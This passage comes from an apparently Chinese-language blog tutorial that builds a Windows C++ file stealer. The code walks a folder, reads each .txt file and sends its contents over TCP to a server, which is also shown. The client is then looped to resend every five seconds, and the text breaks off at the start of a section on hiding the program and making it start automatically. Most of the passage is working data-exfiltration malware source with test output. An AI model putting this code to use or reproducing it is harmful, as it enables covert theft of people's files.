class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filePath)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件，记不住留印象下次翻文档</span></span><br><span class="line">HANDLE hListFile;<span class="comment">//文件以句柄表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//首先找到第一个匹配的文件，借助windows api</span></span><br><span class="line"><span class="type">char</span> searFilePath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;<span class="comment">//注：MAX_PATH是一个宏，值为260</span></span><br><span class="line"><span class="built_in">strcpy</span>(searFilePath, filePath);<span class="comment">//先将传入的文件路径拷贝下来</span></span><br><span class="line"><span class="built_in">strcat</span>(searFilePath, <span class="string">&quot;\\*&quot;</span>);<span class="comment">//再加上一个通配符，*代表全部</span></span><br><span class="line">hListFile = <span class="built_in">FindFirstFile</span>(searFilePath, &amp;FindFileData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环遍历，毕竟是通配符*</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(mypath, filePath);<span class="comment">//copy路径</span></span><br><span class="line"><span class="built_in">strcat</span>(mypath, FindFileData.cFileName);<span class="comment">//将其文件名拼接到路径后面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(mypath, <span class="string">&quot;.txt&quot;</span>))&#123;</span><br><span class="line"><span class="built_in">SendtoServer</span>(mypath);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mypath = %s\n&quot;</span>, mypath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile,&amp;FindFileData));<span class="comment">//FindNextFile返回值NULL则表示结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用自定义函数，估计也要通过c&#x2F;s模式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">SendtoServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_mypath)</span></span>&#123;</span><br><span class="line"><span class="comment">//*初始化网络库</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造socket对象</span></span><br><span class="line">SOCKET sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置要连接的服务器</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//本机ip地址测试</span></span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockCli, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;connect errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件内容</span></span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//尽量调合适大小，避免缓冲区溢出</span></span><br><span class="line">FILE *fp = <span class="built_in">fopen</span>(_mypath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">fread</span>(sendBuf, <span class="number">1</span>, <span class="number">1024</span>, fp);</span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line"><span class="type">int</span> iLen = <span class="built_in">send</span>(sockCli, (<span class="type">char</span> *)sendBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iLen &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;send erroNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockCli);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与之前tcp客户端不同的是此处不需要接受数据，因为传递是通过形参的。</p><hr><p>完整的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SendtoServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_mypath)</span></span>&#123;</span><br><span class="line"><span class="comment">//*初始化网络库</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造socket对象</span></span><br><span class="line">SOCKET sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置要连接的服务器</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//本机ip地址测试</span></span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockCli, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;connect errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//收发数据，对比服务器，客户端应是先收后发</span></span><br><span class="line"><span class="comment">//char recvBuf[100] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="comment">//int iLen = recv(sockCli, recvBuf, 100, 0);</span></span><br><span class="line"><span class="comment">//printf(&quot;recvBuf = %s\n&quot;, recvBuf);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件内容</span></span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//尽量调合适大小，避免缓冲区溢出</span></span><br><span class="line">FILE *fp = <span class="built_in">fopen</span>(_mypath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">fread</span>(sendBuf, <span class="number">1</span>, <span class="number">1024</span>, fp);</span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line"><span class="type">int</span> iLen = <span class="built_in">send</span>(sockCli, (<span class="type">char</span> *)sendBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iLen &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;send erroNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockCli);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filePath)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件，记不住留印象下次翻文档</span></span><br><span class="line">HANDLE hListFile;<span class="comment">//文件以句柄表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//首先找到第一个匹配的文件，借助windows api</span></span><br><span class="line"><span class="type">char</span> searFilePath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;<span class="comment">//注：MAX_PATH是一个宏，值为260</span></span><br><span class="line"><span class="built_in">strcpy</span>(searFilePath, filePath);<span class="comment">//先将传入的文件路径拷贝下来</span></span><br><span class="line"><span class="built_in">strcat</span>(searFilePath, <span class="string">&quot;\\*&quot;</span>);<span class="comment">//再加上一个通配符，*代表全部</span></span><br><span class="line">hListFile = <span class="built_in">FindFirstFile</span>(searFilePath, &amp;FindFileData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环遍历，毕竟是通配符*</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(mypath, filePath);<span class="comment">//copy路径</span></span><br><span class="line"><span class="built_in">strcat</span>(mypath, FindFileData.cFileName);<span class="comment">//将其文件名拼接到路径后面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(mypath, <span class="string">&quot;.txt&quot;</span>))&#123;</span><br><span class="line"><span class="built_in">SendtoServer</span>(mypath);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mypath = %s\n&quot;</span>, mypath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile,&amp;FindFileData));<span class="comment">//FindNextFile返回值NULL则表示结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Steal start!\n&quot;</span>);</span><br><span class="line"><span class="built_in">DoSteal</span>(<span class="string">&quot;E:/mysdk/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console error tips</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_msg)</span></span>&#123;</span><br><span class="line"><span class="built_in">fputs</span>(_msg, stderr);</span><br><span class="line"><span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//初始化网络库</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"><span class="type">char</span> msg[MAX_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;WSAtartup error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;LOBYTE error!&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造socket</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;socket error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSer, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;bind error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;listen error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环接收</span></span><br><span class="line">SOCKADDR_IN addCli;</span><br><span class="line"><span class="type">int</span> cliSize = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line">SOCKET cliSock;</span><br><span class="line"><span class="type">int</span> strLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">cliSock = <span class="built_in">accept</span>(sockSer, (SOCKADDR *)&amp;addCli, &amp;cliSize);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == cliSock)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;accept error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(msg, <span class="number">0</span>, MAX_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((strLen = <span class="built_in">recv</span>(cliSock,msg,MAX_SIZE,<span class="number">0</span>)) != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;server msg:%s\n&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">closesocket</span>(cliSock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//over closesocket</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockSer);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是稍微做了一些优化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//console error tips</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_msg)</span></span>&#123;</span><br><span class="line"><span class="built_in">fputs</span>(_msg, stderr);</span><br><span class="line"><span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这种处理错误的时候，每次提示错误，return -1也麻烦，干脆封装到函数里。</p><hr><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先调整一下客户端，做一个持续延时发送</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Steal start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">DoSteal</span>(<span class="string">&quot;E:/mysdk/&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后先跑到debug文件夹启动服务器<br>在vs中跑客户端程序</p><img src="/2022/07/16/winFiles/004.png" class=""><p>可以看到持续发送之后，因为文件夹里面就放了一个.txt文件，所以一直都是读取这个文件。</p><p>然后可以多创几个txt试试</p><img src="/2022/07/16/winFiles/005.png" class=""><p>现在一共三个.txt文件，然后在循环跑出其中的内容。</p><img src="/2022/07/16/winFiles/006.png" class=""><p>中文乱码跟文件编码有关系，txt默认可能是utf-8，然后vs的项目我也忘看改成啥了多字节还是Unicode，倒不是啥大问题，通信正常就行。</p><p>算了还是改一下吧，将项目修改成多字节，然后文件另存为的时候可以修改编码，或者你有notepad的话可以直接改，记事本好像只能另存为的时候改。</p><img src="/2022/07/16/winFiles/007.png" class=""><p>改完之后再跑一次</p><img src="/2022/07/16/winFiles/008.png" class=""><p>可以看到没问题，中文显示正常。</p><p>printf可能会有缓冲的问题，可能表现在打印很多次之后会卡住一会。<br>那么则可能要用puts之类直接打印字符串的。虽然都差不多。目前是不关注了。</p><blockquote><p>1、不同的换行符<br>puts（）函数会自动在字符串末尾添加一个换行符，这意味着它会自动换行，而printf（）函数没有此功能。<br>2、输出内容不同<br>puts（）函数只能输出字符串，不能对输出和转换指令进行标准化，而printf（）函数可以。</p></blockquote><hr><h2 id="隐藏和自启动"><a href="#隐藏和自启动" class="headerlink" title="隐藏和自启动"></a>隐藏和自启动</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 